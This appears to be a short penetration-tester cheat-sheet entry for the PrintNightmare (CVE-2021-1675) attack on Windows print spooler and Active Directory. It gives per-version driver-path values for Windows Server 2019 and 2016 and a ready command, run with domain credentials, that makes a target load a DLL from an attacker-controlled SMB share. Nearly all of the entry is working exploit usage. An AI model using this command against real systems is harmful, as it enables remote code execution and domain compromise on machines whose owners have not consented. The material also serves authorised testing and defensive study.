
# PrintNightmare

% printerbug, Active directory
#plateform/linux  #target/remote #cat/ATTACK/COERCE 


## coerce
https://github.com/cube0x0/CVE-2021-1675

- windows server 2019
  container_info['DriverInfo']['Level2']['pDriverPath']  = "C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_83aa9aebf5dffc96\\Amd64\\UNIDRV.DLL\x00"
- windows server 2016          
  container_info['DriverInfo']['Level2']['pDriverPath']  = "C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_db4f0d0030e708f4\\Amd64\\UNIDRV.DLL\x00"

Need a real smb server (not work with the impacket server)

```
CVE-2021-1675.py <domain>/<user>:<password>@<target_ip> '\\<attacker_ip>\<share_name>\<dll_name|inject>.dll'
```